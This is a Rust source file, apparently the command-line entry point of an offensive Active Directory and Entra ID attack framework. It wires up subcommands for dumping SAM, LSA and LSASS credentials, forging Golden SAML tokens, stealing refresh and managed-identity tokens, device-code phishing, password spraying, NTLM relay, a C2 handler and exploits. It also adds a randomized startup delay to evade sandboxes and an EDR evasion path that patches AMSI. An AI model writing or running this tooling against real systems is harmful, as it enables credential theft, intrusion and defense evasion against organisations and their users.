    /// Dump SAM hive
    Sam {
        /// Path to SAM registry hive
        #[arg(long, required = true)]
        sam: String,
        /// Path to SYSTEM registry hive
        #[arg(long, required = true)]
        system: String,
    },
    /// Dump LSA secrets
    Lsa {
        /// Path to SECURITY registry hive
        #[arg(long, required = true)]
        security: String,
        /// Path to SYSTEM registry hive
        #[arg(long, required = true)]
        system: String,
    },
    /// Dump DCC2 cached domain credentials
    Dcc2 {
        /// Path to SECURITY registry hive
        #[arg(long, required = true)]
        security: String,
        /// Path to SYSTEM registry hive
        #[arg(long, required = true)]
        system: String,
    },
}

// ──────────────────────────────────────────────────────────
// Azure AD / Entra ID attack sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum AzureAction {
    /// Enumerate hybrid identity configuration
    Enum,
    /// Seamless SSO abuse — Silver Ticket for Azure AD Kerberos
    SeamlessSso,
    /// Golden SAML — forge arbitrary SAML tokens with ADFS signing cert
    GoldenSaml {
        /// ADFS signing certificate (base64-encoded PFX or PEM)
        #[arg(long)]
        signing_cert: Option<String>,
        /// ADFS signing certificate private key (base64)
        #[arg(long)]
        signing_key: Option<String>,
        /// IdP entity ID (defaults to <https://sts.windows.net/{tenant_id}/>)
        #[arg(long)]
        idp_entity_id: Option<String>,
    },
    /// PRT theft — extract Primary Refresh Token from a compromised session
    PrtTheft,
    /// Managed Identity token theft — extract token from Azure VM IMDS
    ManagedIdentityToken,
    /// Extract Entra Connect credentials
    EntraConnectExtract,
    /// Azure App Registration credential abuse
    AppRegistrationAbuse,
    /// Device Code phishing — trick users into approving MFA token requests
    DeviceCodePhish,
}

// ──────────────────────────────────────────────────────────
// Attack graph sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum GraphAction {
    /// Build attack graph from LDAP enumeration
    Build,
    /// View attack graph (BloodHound-style JSON viewer)
    View {
        /// Input graph JSON file(s)
        #[arg(short, long, required = true)]
        input: Vec<String>,
    },
    /// Launch web GUI for interactive graph exploration
    Gui {
        /// Input graph JSON file(s)
        #[arg(short, long, required = true)]
        input: Vec<String>,
        /// Web server port
        #[arg(long, default_value = "8080")]
        port: u16,
    },
    /// Display tree view of the attack graph
    Tree {
        /// Input graph JSON file(s)
        #[arg(short, long, required = true)]
        input: Vec<String>,
    },
    /// Find shortest attack path between two nodes
    Path {
        /// Source node (sAMAccountName)
        #[arg(short, long, required = true)]
        from: String,
        /// Target node (sAMAccountName)
        #[arg(short, long, required = true)]
        to: String,
    },
    /// Find all paths to Domain Admin
    PathToDa {
        /// Starting node (sAMAccountName)
        #[arg(short, long, required = true)]
        from: String,
    },
    /// Print graph statistics
    Stats,
    /// Export graph in various formats
    Export {
        /// Output file path
        #[arg(short, long, required = true)]
        output: String,
        /// Export in BloodHound JSON format
        #[arg(long)]
        bloodhound: bool,
    },
}

// ──────────────────────────────────────────────────────────
// Shell completion targets
// ──────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, clap::ValueEnum)]
enum CompletionShell {
    Bash,
    Fish,
    Zsh,
    PowerShell,
    Elvish,
}

// ──────────────────────────────────────────────────────────
// Main
// ──────────────────────────────────────────────────────────

fn main() -> ExitCode {
    // Spawn on a thread with 8 MB stack — the CLI parser with 28 subcommands
    // and nested enums can exceed the default 1 MB stack in debug builds.
    let thread = match std::thread::Builder::new()
        .stack_size(8 * 1024 * 1024)
        .spawn(|| -> i32 {
            // Anti-emulation: short startup delay to evade basic sandbox heuristics.
            // Randomised 500-1500ms to defeat deterministic skip logic.
            let delay = (std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_millis()
                % 1000
                + 500) as u64;
            if delay > 0 {
                std::thread::sleep(std::time::Duration::from_millis(delay));
            }
            match tokio::runtime::Builder::new_multi_thread()
                .enable_all()
                .build()
            {
                Ok(rt) => rt.block_on(async_main()),
                Err(e) => {
                    banner::print_fail(&format!("Failed to build tokio runtime: {}", e));
                    1
                }
            }
        }) {
        Ok(h) => h,
        Err(e) => {
            banner::print_fail(&format!("Failed to spawn main thread: {}", e));
            return ExitCode::from(1);
        }
    };

    match thread.join() {
        Ok(exit_code) => ExitCode::from(exit_code as u8),
        Err(_) => {
            banner::print_fail("Main thread panicked");
            ExitCode::from(1)
        }
    }
}

async fn async_main() -> i32 {
    if let Err(e) = install_rustls_provider() {
        banner::print_fail(&e);
        return 1;
    }

    let mut cli = Cli::parse();

    // Load TOML config and merge into Cli.
    //
    // Precedence (highest to lowest):
    //   1. CLI flag / clap `env` binding (already merged into `cli` by `Cli::parse()`)
    //   2. Active profile (`<config_dir>/profiles/<NAME>.toml`, if --profile or OT_PROFILE is set)
    //   3. Main config.toml (loaded from --config path, OT_CONFIG, or XDG search)
    //   4. Built-in default (encoded as the `None` variants of each field)
    //
    // We load both the main config and the active profile; the profile is
    // applied on top of the main config so any fields the profile sets
    // override the main config. CLI flags still win over both.
    let main_config = cli_config::load_config(cli.config.as_deref()).ok();
    let active_profile = cli
        .profile
        .clone()
        .or_else(|| cli_config::active_profile().ok().flatten());
    let profile_config = match active_profile.as_deref() {
        Some(name) => match cli_config::load_profile(name) {
            Ok(cfg) => Some(cfg),
            Err(e) => {
                tracing::warn!("Failed to load profile '{}': {}", name, e);
                None
            }
        },
        None => None,
    };

    if let Some(profile) = profile_config {
        tracing::info!(
            "Loaded profile '{}' (overrides main config for unset fields)",
            active_profile.as_deref().unwrap_or("")
        );
        apply_config_layer(&mut cli, &profile, "profile");
    }
    if let Some(config) = main_config {
        apply_config_layer(&mut cli, &config, "config");
    }

    let filter = match cli.verbose {
        0 => "warn",
        1 => "info",
        2 => "debug",
        _ => "trace",
    };

    if cli.json_log {
        fmt()
            .with_env_filter(
                EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new(filter)),
            )
            .with_target(false)
            .json()
            .init();
    } else {
        fmt()
            .with_env_filter(
                EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new(filter)),
            )
            .with_target(false)
            .compact()
            .init();
    }

    banner::print_banner();

    if cli.modules {
        let modules = compiled_modules();
        println!("Compiled features: {}", modules.join(", "));
        return 0;
    }

    // Register all built-in modules (core + extended CME-style)
    // This ensures `ovt module list` returns available modules.
    ovt_modules::register_core_modules().await;
    modules_ext::register_extended_modules().await;

    match *cli.command {
        Commands::Wizard { args } => match commands::wizard::run(args.clone()).await {
            Ok(_) => 0,
            Err(e) => {
                banner::print_fail(&format!("Wizard error: {}", e));
                1
            }
        },
        Commands::Session { ref action } => {
            match commands::session::run(commands::session::SessionArgs {
                action: action.clone(),
            }) {
                Ok(_) => 0,
                Err(e) => {
                    banner::print_fail(&format!("Session error: {}", e));
                    1
                }
            }
        }
        Commands::Ccach { ref action } => commands::ccache::run(commands::ccache::CcacheArgs {
            action: action.clone(),
        }),
        Commands::Config { ref action } => {
            match commands::config::run(commands::config::ConfigArgs {
                action: action.clone(),
            }) {
                Ok(_) => 0,
                Err(e) => {
                    banner::print_fail(&format!("Config error: {}", e));
                    1
                }
            }
        }
        #[cfg(feature = "reaper")]
        Commands::Reaper {
            ref modules,
            page_size,
        } => cmd_reaper(&cli, modules.clone(), page_size).await,
        #[cfg(feature = "reaper")]
        Commands::Snaffler { page_size } => cmd_snaffler(&cli, page_size).await,
        #[cfg(feature = "reaper")]
        Commands::Enum {
            ref target,
            ref filter,
            include_disabled,
        } => cmd_enum(&cli, *target, filter.clone(), include_disabled).await,
        #[cfg(feature = "reaper")]
        Commands::Powerview { ref action } => cmd_powerview(&cli, action.clone()).await,
        Commands::Guid { ref action } => cmd_guid(action.clone()),
        #[cfg(feature = "hunter")]
        Commands::Kerberos { ref action } => cmd_kerberos(&cli, action.clone()).await,
        Commands::Smb { ref action } => cmd_smb(&cli, action.clone()).await,
        Commands::Exec {
            ref method,
            ref target,
            ref command,
        } => cmd_exec(&cli, method.clone(), target, command).await,
        Commands::Graph {
            ref file,
            ref action,
        } => cmd_graph(&cli, file.as_deref(), action.clone()).await,
        #[cfg(feature = "hunter")]
        Commands::Spray {
            ref password,
            ref userlist,
            use_ldap,
            delay,
            jitter,
            concurrency,
        } => {
            cmd_spray(
                &cli,
                password,
                userlist.as_deref(),
                use_ldap,
                delay,
                jitter,
                concurrency,
            )
            .await
        }

        Commands::Dump {
            ref target,
            ref source,
        } => commands_impl::cmd_dump(&cli, target, *source).await,
        Commands::DumpLsass {
            ref output,
            method,
            pid,
            no_etw_suppress,
        } => {
            commands_impl::cmd_dump_lsass(&cli, output.as_deref(), method, pid, !no_etw_suppress)
                .await
        }
        Commands::Doctor { ref checks } => {
            let checks_opt = if checks.is_empty() {
                None
            } else {
                Some(checks.clone())
            };
            commands::doctor::run(checks_opt, cli.dc_host.as_deref()).await
        }
        #[cfg(feature = "scribe")]
        Commands::Report {
            ref input,
            ref output,
            ref format,
        } => commands_impl::cmd_report(&cli, input, output, format.clone()).await,
        #[cfg(feature = "forge")]
        Commands::Forge { ref action } => commands_impl::cmd_forge(&cli, action).await,
        #[cfg(feature = "reaper")]
        Commands::Crack {
            ref hash,
            ref file,
            ref mode,
            ref wordlist,
            max_candidates,
            hashcat,
        } => {
            commands_impl::cmd_crack(
                &cli,
                hash.as_deref(),
                file.as_deref(),
                mode.clone(),
                wordlist.as_deref(),
                max_candidates,
                hashcat,
            )
            .await
        }
        Commands::Rid {
            start_rid,
            end_rid,
            null_session,
        } => commands_impl::cmd_rid(&cli, start_rid, end_rid, null_session).await,
        #[cfg(feature = "reaper")]
        Commands::Move {
            ref action,
            ref poison_ip,
            respond,
        } => commands_impl::cmd_move(&cli, action, poison_ip.as_deref(), respond).await,
        Commands::Gpp {
            ref file,
            ref cpassword,
        } => commands_impl::cmd_gpp(&cli, file.as_deref(), cpassword.as_deref()).await,
        #[cfg(feature = "reaper")]
        Commands::Laps { ref computer } => commands_impl::cmd_laps(&cli, computer.as_deref()).await,
        #[cfg(feature = "reaper")]
        Commands::ShadowCred { ref action } => commands_impl::cmd_shadow_cred(&cli, action).await,
        #[cfg(feature = "reaper")]
        Commands::Assess { ref modules } => commands_impl::cmd_assess(&cli, modules).await,
        Commands::BloodHound { ref action } => commands_impl::cmd_bloodhound(&cli, action).await,
        Commands::Secrets { ref action } => commands_impl::cmd_secrets(action).await,
        #[cfg(feature = "relay")]
        Commands::Ntlm { ref action } => cmd_ntlm(action.clone()).await,
        #[cfg(feature = "forge")]
        Commands::Adcs { ref action } => commands_impl::cmd_adcs(&cli, action).await,
        Commands::Shell {
            ref target,
            ref shell_type,
        } => commands_impl::cmd_shell(target, shell_type).await,
        Commands::Sccm { ref action } => commands_impl::cmd_sccm(&cli, action).await,
        Commands::Scan {
            ref targets,
            ref ports,
            ref scan_type,
            timeout,
            ldap,
            smb,
            no_ldap,
            no_smb,
        } => {
            commands_impl::cmd_scan(
                &cli,
                targets,
                ports,
                scan_type,
                timeout,
                ldap && !no_ldap,
                smb && !no_smb,
            )
            .await
        }
        Commands::Mssql {
            ref action,
            ref proxy,
        } => cmd_mssql(&cli, action.clone(), proxy.as_deref()).await,
        #[cfg(feature = "viewer")]
        Commands::Tui {
            ref domain,
            crawl,
            ref load,
        } => commands_impl::cmd_tui(&cli, domain, crawl, load.as_deref()).await,

        // ─── NEW: Plugin handler ─────────────────────────────
        Commands::Plugin { ref action } => {
            let mut plugin_registry = PluginRegistry::new();
            let ctx = make_plugin_context(&cli);
            commands_impl::cmd_plugin(&cli, &mut plugin_registry, &ctx, action.clone()).await
        }

        // ─── Module handler ──────────────────────────────────
        Commands::Module { ref action } => match action {
            ModuleAction::List { category } => {
                commands_impl::cmd_module_list(&cli, category.as_deref()).await
            }
            ModuleAction::Info { name } => commands_impl::cmd_module_info(&cli, name.clone()).await,
            ModuleAction::Run {
                name,
                target,
                params,
            } => {
                commands_impl::cmd_module_run(&cli, name.clone(), target.clone(), params.clone())
                    .await
            }
            ModuleAction::RunParallel {
                name,
                targets,
                params,
                concurrency,
            } => {
                commands_impl::cmd_module_run_parallel(
                    &cli,
                    name.clone(),
                    targets.clone(),
                    params.clone(),
                    *concurrency,
                )
                .await
            }
        },

        // ─── NEW: C2 handler ─────────────────────────────────
        Commands::C2 { ref action } => {
            let mut c2_manager = C2Manager::new();
            commands_impl::cmd_c2(&mut c2_manager, action.clone()).await
        }

        // ─── ACL abuse handler ───────────────────────────────
        Commands::Acl { ref action } => cmd_acl(&cli, action.clone()).await,

        // ─── GPO abuse handler ───────────────────────────────
        Commands::Gpo { ref action } => cmd_gpo(&cli, action.clone()).await,

        // ─── Azure AD attack handler ─────────────────────────
        Commands::Azure { ref action } => commands_impl::cmd_azure(&cli, action).await,

        // ─── Credential Guard check handler ──────────────────
        Commands::Cg { ref target } => cmd_cg(&cli, target).await,

        // ─── EDR evasion handler ─────────────────────────────
        Commands::Edr { ref action } => cmd_edr(&cli, *action).await,

        // ─── CVE exploit handler ─────────────────────────────
        Commands::Exploit { ref action } => cmd_exploit(&cli, action.clone()).await,

        // ─── Shell completion generation ─────────────────────
        Commands::Completions {
            shell,
            output: ref completion_output,
        } => {
            let clap_shell = match shell {
                CompletionShell::Bash => ClapShell::Bash,
                CompletionShell::Fish => ClapShell::Fish,
                CompletionShell::Zsh => ClapShell::Zsh,
                CompletionShell::PowerShell => ClapShell::PowerShell,
                CompletionShell::Elvish => ClapShell::Elvish,
            };
            let mut cmd = Cli::command();
            if let Some(path) = completion_output.as_deref() {
                match std::fs::File::create(path) {
                    Ok(mut f) => {
                        clap_generate(clap_shell, &mut cmd, "ovt", &mut f);
                        eprintln!("Completions written to: {}", path);
                    }
                    Err(e) => {
                        banner::print_fail(&format!("Failed to create file '{}': {}", path, e));
                        return 1;
                    }
                }
            } else {
                clap_generate(clap_shell, &mut cmd, "ovt", &mut std::io::stdout());
            }
            0
        }
    }
}

// ──────────────────────────────────────────────────────────
// NEW: Plugin Context Helper
// ──────────────────────────────────────────────────────────

/// Merge one layer of config (either the active profile or the main
/// `config.toml`) into the `Cli` struct. Only fields the user did not
/// set via CLI flag or clap `env` binding are touched. Strings are
/// guarded by `is_none()`; numeric/bool fields are guarded by their
/// "default" sentinel (verbose == 0, dry_run/json_log == false,
/// stdout_format == Text, auth_method == Password).
///
/// `layer_label` is just used for tracing when we warn about an
/// invalid enum value.
fn apply_config_layer(cli: &mut Cli, config: &cli_config::CliConfig, layer_label: &str) {
    if cli.dc_host.is_none() {
        cli.dc_host = config.dc_host.clone();
    }
    if cli.domain.is_none() {
        cli.domain = config.domain.clone();
    }
    if cli.username.is_none() {
        cli.username = config.username.clone();
    }
    if cli.password.is_none() {
        cli.password = config.password.clone();
    }
    if cli.nt_hash.is_none() {
        cli.nt_hash = config.nt_hash.clone();
    }
    if cli.ticket.is_none() {
        cli.ticket = config.ticket.clone();
    }
    if cli.pkinit_cert.is_none() {
        cli.pkinit_cert = config.pkinit_cert.clone();
    }
    if cli.pkinit_key.is_none() {
        cli.pkinit_key = config.pkinit_key.clone();
    }
    if cli.outfile.is_none() {
        cli.outfile = config.outfile.clone();
    }
    if cli.user_list.is_none() {
        cli.user_list = config.user_list.clone();
    }
    if cli.pass_list.is_none() {
        cli.pass_list = config.pass_list.clone();
    }
    if cli.user_pass_list.is_none() {
        cli.user_pass_list = config.user_pass_list.clone();
    }
    if cli.verbose == 0
        && let Some(v) = config.verbose
    {
        cli.verbose = v;
    }
    if !cli.dry_run
        && let Some(v) = config.dry_run
    {
        cli.dry_run = v;
    }
    if !cli.json_log
        && let Some(v) = config.json_log
    {
        cli.json_log = v;
    }
    if cli.stdout_format == OutputFormat::Text
        && let Some(ref fmt) = config.stdout_format
    {
        match fmt.parse::<OutputFormat>() {
            Ok(parsed) => cli.stdout_format = parsed,
            Err(_) => tracing::warn!(
                "Ignoring invalid stdout_format '{}' from {} (expected: text|json|csv)",
                fmt,
                layer_label
            ),
        }
    }
    if cli.auth_method == AuthMethod::Password
        && let Some(ref m) = config.auth_method
    {
        match m.parse::<AuthMethod>() {
            Ok(parsed) => cli.auth_method = parsed,
            Err(_) => tracing::warn!(
                "Ignoring invalid auth_method '{}' from {} (expected: password|hash|ticket)",
                m,
                layer_label
            ),
        }
    }
}

fn make_plugin_context(cli: &Cli) -> PluginContext {
    let domain = cli.domain.clone().unwrap_or_else(|| "local".to_string());
    PluginContext {
        domain,
        dc_ip: cli.dc_host.clone(),
        credentials: None,
        graph: Arc::new(RwLock::new(AttackGraph::new())),
        state: Arc::new(RwLock::new(HashMap::new())),
        log_prefix: "cli".to_string(),
    }
}

// ──────────────────────────────────────────────────────────
// Helpers
// ──────────────────────────────────────────────────────────

fn require_creds(cli: &Cli) -> std::result::Result<Credentials, i32> {
    let creds = resolve_credentials_from_cli(cli).map_err(|e| {
        banner::print_fail(&format!("Auth error: {}", e));
        1
    })?;
    creds.into_iter().next().ok_or_else(|| {
        banner::print_fail("No credentials resolved");
        1
    })
}

/// Retrieve credentials if available without terminating on missing arguments
fn require_creds_silent(cli: &Cli) -> std::result::Result<Credentials, String> {
    let creds = resolve_credentials_from_cli(cli)?;
    creds
        .into_iter()
        .next()
        .ok_or_else(|| "No credentials resolved".to_string())
}

/// Resolve all credentials from CLI args, supporting credential lists.
/// Returns a Vec of Credentials to iterate over.
fn require_creds_list(cli: &Cli) -> std::result::Result<Vec<Credentials>, i32> {
    resolve_credentials_from_cli(cli).map_err(|e| {
        banner::print_fail(&format!("Auth error: {}", e));
        1
    })
}

fn resolve_credentials_from_cli(cli: &Cli) -> std::result::Result<Vec<Credentials>, String> {
    let domain = cli.domain.as_deref().unwrap_or("");
    auth::resolve_credentials(
        domain,
        cli.username.as_deref(),
        cli.password.as_deref(),
        cli.nt_hash.as_deref(),
        cli.ticket.as_deref(),
        Some(cli.auth_method.clone()),
        cli.user_list.as_deref(),
        cli.pass_list.as_deref(),
        cli.user_pass_list.as_deref(),
    )
}

/// Require credentials for operations that need domain and DC access
/// but not a specific username. Used by spray operations.
fn require_dc_only_creds(cli: &Cli) -> std::result::Result<String, i32> {
    match cli.domain.as_deref() {
        Some(domain) => Ok(domain.to_string()),
        None => {
            banner::print_fail("--domain is required");
            Err(1)
        }
    }
}

fn require_dc(cli: &Cli) -> std::result::Result<String, i32> {
    cli.dc_host.clone().ok_or_else(|| {
        banner::print_fail("--dc-host is required");
        1
    })
}

#[cfg(feature = "reaper")]
fn make_reaper_config(
    cli: &Cli,
    creds: Credentials,
    dc: String,
    modules: Vec<String>,
    page_size: u32,
) -> std::result::Result<ReaperConfig, i32> {
    let domain = match cli.domain.clone() {
        Some(d) => d,
        None => {
            banner::print_fail("--domain is required");
            return Err(1);
        }
    };
    let base_dn = ReaperConfig::base_dn_from_domain(&domain);

    Ok(ReaperConfig {
        dc_ip: dc,
        domain,
        base_dn,
        username: creds.username.clone(),
        password: creds.password().map(str::to_string),
        nt_hash: creds.nthash().map(str::to_string),
        modules,
        page_size,
        use_ldaps: false,
    })
}

// ──────────────────────────────────────────────────────────
// Command handlers (existing — kept as-is)
// ──────────────────────────────────────────────────────────

// cmd_reaper
#[cfg(feature = "reaper")]
async fn cmd_reaper(cli: &Cli, modules: Vec<String>, page_size: u32) -> i32 {
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    let dc = match cli.dc_host.clone() {
        Some(d) => d,
        None => {
            banner::print_fail("--dc-host is required");
            return 1;
        }
    };

    let config = match make_reaper_config(cli, creds, dc, modules, page_size) {
        Ok(c) => c,
        Err(e) => return e,
    };

    match overthrone_reaper::runner::run_reaper(&config).await {
        Ok(_) => 0,
        Err(e) => {
            banner::print_fail(&format!("Reaper error: {}", e));
            1
        }
    }
}

#[cfg(feature = "reaper")]
async fn cmd_snaffler(cli: &Cli, page_size: u32) -> i32 {
    banner::print_module_banner("SNAFFLER");

    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };
    let config = match make_reaper_config(cli, creds, dc, vec!["snaffler".to_string()], page_size) {
        Ok(c) => c,
        Err(e) => return e,
    };

    match overthrone_reaper::snaffler::run_snaffler(&config).await {
        Ok(findings) => {
            if matches!(cli.stdout_format, OutputFormat::Json) {
                let json = serde_json::to_string_pretty(&findings)
                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"));
                println!("{json}");
                if let Some(path) = &cli.outfile
                    && let Err(e) = std::fs::write(path, &json)
                {
                    eprintln!("warn: failed to write output file '{}': {}", path, e);
                }
                return 0;
            }

            if findings.is_empty() {
                banner::print_info("No sensitive files matched the Snaffler patterns");
            } else {
                banner::print_success(&format!("Found {} sensitive files", findings.len()));
                for finding in &findings {
                    println!(
                        "  [S{}] \\\\{}\\{}\\{} - {} ({} bytes)",
                        finding.severity,
                        finding.hostname,
                        finding.share,
                        finding.path,
                        finding.reason,
                        finding.size
                    );
                }
                if let Some(path) = &cli.outfile {
                    let json = serde_json::to_string_pretty(&findings).unwrap_or_default();
                    if let Err(e) = std::fs::write(path, &json) {
                        eprintln!("warn: failed to write output file '{}': {}", path, e);
                    }
                }
            }
            0
        }
        Err(e) => {
            banner::print_fail(&format!("Snaffler error: {}", e));
            1
        }
    }
}

#[cfg(feature = "reaper")]
async fn cmd_powerview(cli: &Cli, action: PowerViewAction) -> i32 {
    match action {
        PowerViewAction::Users {
            identity,
            filter,
            include_disabled,
        } => {
            cmd_enum(
                cli,
                EnumTarget::Users,
                identity.or(filter),
                include_disabled,
            )
            .await
        }
        PowerViewAction::Computers {
            filter,
            include_disabled,
        } => cmd_enum(cli, EnumTarget::Computers, filter, include_disabled).await,
        PowerViewAction::Groups { group, filter } => {
            cmd_enum(cli, EnumTarget::Groups, group.or(filter), false).await
        }
        PowerViewAction::Trusts => cmd_enum(cli, EnumTarget::Trusts, None, false).await,
        PowerViewAction::Spns => cmd_enum(cli, EnumTarget::Spns, None, false).await,
        PowerViewAction::Asrep => cmd_enum(cli, EnumTarget::Asrep, None, false).await,
        PowerViewAction::Delegations => cmd_enum(cli, EnumTarget::Delegations, None, false).await,
        PowerViewAction::Gpos { name } => cmd_enum(cli, EnumTarget::Gpos, name, false).await,
        PowerViewAction::Policy => cmd_enum(cli, EnumTarget::Policy, None, false).await,
        PowerViewAction::Laps { computer } => {
            commands_impl::cmd_laps(cli, computer.as_deref()).await
        }
        PowerViewAction::Acls { sid } => cmd_acl(cli, AclAction::Enum { sid }).await,
        PowerViewAction::All => cmd_enum(cli, EnumTarget::All, None, false).await,
    }
}

#[derive(Clone, Copy)]
struct GuidEntry {
    guid: &'static str,
    name: &'static str,
    category: &'static str,
    maps_to: &'static str,
    note: &'static str,
}

const AD_GUIDS: &[GuidEntry] = &[
    GuidEntry {
        guid: "00299570-246d-11d0-a768-00aa006e0529",
        name: "User-Force-Change-Password",
        category: "ControlAccessRight",
        maps_to: "ForceChangePassword",
        note: "Lets the trustee reset a user password without knowing the current password.",
    },
    GuidEntry {
        guid: "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
        name: "DS-Replication-Get-Changes",
        category: "ControlAccessRight",
        maps_to: "GetChanges",
        note: "One of the replication rights required for DCSync-style secret replication.",
    },
    GuidEntry {
        guid: "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
        name: "DS-Replication-Get-Changes-All",
        category: "ControlAccessRight",
        maps_to: "GetChangesAll",
        note: "Pairs with Get-Changes for full secret replication impact.",
    },
    GuidEntry {
        guid: "89e95b76-444d-4c62-991a-0facbeda640c",
        name: "DS-Replication-Get-Changes-In-Filtered-Set",
        category: "ControlAccessRight",
        maps_to: "GetChangesInFilteredSet",
        note: "Filtered-set replication right; important on hardened domains and RODC-related paths.",
    },
    GuidEntry {
        guid: "bf9679c0-0de6-11d0-a285-00aa003049e2",
        name: "member",
        category: "AttributeSchema",
        maps_to: "AddMembers/WriteSelf",
        note: "WriteProperty(member) or validated self-membership can add principals to groups.",
    },
];

fn cmd_guid(action: GuidAction) -> i32 {
    match action {
        GuidAction::Resolve { value } => {
            let query = normalize_guid_query(&value);
            let matches: Vec<_> = AD_GUIDS
                .iter()
                .copied()
                .filter(|entry| guid_entry_matches(*entry, &query))
                .collect();
            if matches.is_empty() {
                banner::print_fail(&format!("No built-in GUID mapping found for '{}'", value));
                println!(
                    "Tip: use `ovt powerview acls` or `ovt acl enum` against LDAP to inspect live objectType GUIDs."
                );
                return 1;
            }
            for entry in matches {
                print_guid_entry(entry);
            }
            0
        }
        GuidAction::List { filter } => {
            let query = filter.as_deref().map(normalize_guid_query);
            for entry in AD_GUIDS
                .iter()
                .copied()
                .filter(|entry| query.as_ref().is_none_or(|q| guid_entry_matches(*entry, q)))
            {
                print_guid_entry(entry);
            }
            0
        }
    }
}

fn normalize_guid_query(value: &str) -> String {
    value
        .trim()
        .replace(['{', '}'], "")
        .replace([' ', '_'], "-")
        .to_ascii_lowercase()
}

fn guid_entry_matches(entry: GuidEntry, query: &str) -> bool {
    entry.guid.eq_ignore_ascii_case(query)
        || entry.name.to_ascii_lowercase().contains(query)
        || entry.category.to_ascii_lowercase().contains(query)
        || entry.maps_to.to_ascii_lowercase().contains(query)
}

fn print_guid_entry(entry: GuidEntry) {
    println!("{}", entry.name.bold().cyan());
    println!("  GUID:     {}", entry.guid.yellow());
    println!("  Category: {}", entry.category);
    println!("  OVT edge: {}", entry.maps_to.green());
    println!("  Note:     {}", entry.note);
}

// ──────────────────────────────────────────────────────────
// cmd_cg — Credential Guard Check
// ──────────────────────────────────────────────────────────

async fn cmd_cg(cli: &Cli, target: &str) -> i32 {
    banner::print_module_banner("CREDENTIAL GUARD CHECK");

    let domain = cli.domain.as_deref().unwrap_or("unknown");
    println!("  {} Target: {}", "▸".bright_black(), target.cyan());
    println!("  {} Domain: {}", "▸".bright_black(), domain.cyan());

    use overthrone_core::postex::comprehensive_cg_check;

    // Establish SMB session for remote registry CG detection
    let mut smb_session = None;
    if let Some(ref user) = cli.username {
        if let Some(ref pass) = cli.password {
            match overthrone_core::proto::smb::SmbSession::connect(target, domain, user, pass).await
            {
                Ok(s) => {
                    println!("  {} SMB session established to {target}", "✓".green());
                    smb_session = Some(s);
                }
                Err(e) => {
                    println!("  {} SMB connect (optional): {e}", "▸".bright_black());
                }
            }
        } else if let Some(ref hash) = cli.nt_hash {
            match overthrone_core::proto::smb::SmbSession::connect_with_hash(
                target, domain, user, hash,
            )
            .await
            {
                Ok(s) => {
                    println!(
                        "  {} SMB session established (PTH) to {target}",
                        "✓".green()
                    );
                    smb_session = Some(s);
                }
                Err(e) => {
                    println!("  {} SMB PTH connect (optional): {e}", "▸".bright_black());
                }
            }
        } else {
            println!(
                "  {} SMB: no password or NT hash provided",
                "▸".bright_black()
            );
        }
    } else {
        println!("  {} SMB: skipped (no --username)", "▸".bright_black());
    }

    // Establish LDAP session for domain-level CG assessment
    let mut ldap_session = None;
    let has_hash = cli.nt_hash.is_some();
    let ldap_pass = cli
        .nt_hash
        .as_deref()
        .or(cli.password.as_deref())
        .unwrap_or("");
    if let Some(ref user) = cli.username {
        let ldap_user = if has_hash {
            format!("{domain}\\{user}")
        } else {
            user.clone()
        };
        match overthrone_core::proto::ldap::LdapSession::connect(
            target, domain, &ldap_user, ldap_pass, has_hash,
        )
        .await
        {
            Ok(s) => {
                println!("  {} LDAP session established to {target}", "✓".green());
                ldap_session = Some(s);
            }
            Err(e) => {
                println!("  {} LDAP connect (optional): {e}", "▸".bright_black());
            }
        }
    } else {
        println!("  {} LDAP: skipped (no --username)", "▸".bright_black());
    }

    match comprehensive_cg_check(
        target,
        domain,
        smb_session.as_mut(),
        ldap_session.as_mut(),
        cli.username.as_deref(),
        cli.password.as_deref(),
    )
    .await
    {
        Ok(result) => {
            println!(
                "  {} CG Status: {:?} (confidence: {:.1}%)",
                "✓".green(),
                result.status,
                result.confidence * 100.0
            );
            println!(
                "  {} Recommendation: {}",
                "▸".bright_black(),
                result.recommendation
            );
            for finding in &result.findings {
                println!("    - {}", finding);
            }
            banner::print_success("Credential Guard check complete");
            0
        }
        Err(e) => {
            banner::print_fail(&format!("CG check failed: {}", e));
            1
        }
    }
}

// ──────────────────────────────────────────────────────────
// cmd_edr — EDR Assessment and Evasion
// ──────────────────────────────────────────────────────────

async fn cmd_edr(_cli: &Cli, action: EdrAction) -> i32 {
    use overthrone_core::postex::{apply_stealth_profile, assess_edr_landscape};

    match action {
        EdrAction::Assess => {
            banner::print_module_banner("EDR ASSESSMENT");
            match assess_edr_landscape() {
                Ok(assessment) => {
                    println!(
                        "  {} Products detected: {}",
                        "▸".bright_black(),
                        assessment.detected_products.len()
                    );
                    for p in &assessment.detected_products {
                        println!("    - {:?}", p);
                    }
                    println!(
                        "  {} NTDLL hooked: {}",
                        "▸".bright_black(),
                        assessment.ntdll_hooked
                    );
                    println!(
                        "  {} ETW active: {}",
                        "▸".bright_black(),
                        assessment.etw_active
                    );
                    println!(
                        "  {} AMSI loaded: {}",
                        "▸".bright_black(),
                        assessment.amsi_loaded
                    );
                    println!(
                        "  {} Recommendation: {:?}",
                        "▸".bright_black(),
                        assessment.recommendation
                    );
                    for finding in &assessment.findings {
                        println!("    - {}", finding);
                    }
                    banner::print_success("EDR assessment complete");
                    return 0;
                }
                Err(e) => {
                    banner::print_fail(&format!("EDR assessment failed: {}", e));
                    return 1;
                }
            }
        }
        EdrAction::Evade => {
            banner::print_module_banner("EDR EVASION");

            match assess_edr_landscape() {
                Ok(assessment) => {
                    println!(
                        "  {} Detected {} EDR product(s)",
                        "▸".bright_black(),
                        assessment.detected_products.len()
                    );
                    match apply_stealth_profile(&assessment) {
                        Ok(stealth) => {
                            if stealth.success {
                                println!(
                                    "  {} AMSI patched: {}",
                                    "✓".green(),
                                    stealth.amsi_patched
